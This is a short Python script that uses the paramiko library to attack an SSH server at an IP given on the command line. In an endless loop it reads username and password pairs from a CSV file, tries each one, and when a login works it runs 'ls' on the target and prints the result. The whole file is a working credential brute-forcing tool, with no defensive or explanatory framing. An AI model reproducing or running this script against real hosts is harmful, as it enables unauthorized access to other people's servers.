import paramiko
import csv
import time
import sys
ip = sys.argv[1]
print("target IP is: "+ip)
def sshconnect(usr, pwd):
    command = "ls"
    host = ip
    username = usr
    password = pwd
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=username, password=password)
    except paramiko.ssh_exception.AuthenticationException:
        print("[*]Authentication Failed")
        client.close()
        return
    print("[*]Authentication Success!")
    stdin,stdout,stderr = client.exec_command("ls")
    print(stdout.read().decode())
    client.close()
while True:
    time.sleep(5)
    with open('users.csv') as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')
        line_count = 0
        for row in csv_reader:
            print(f'\t username:{row[0]} password:{row[1]}')
            sshconnect(row[0],row[1])
            time.sleep(3)
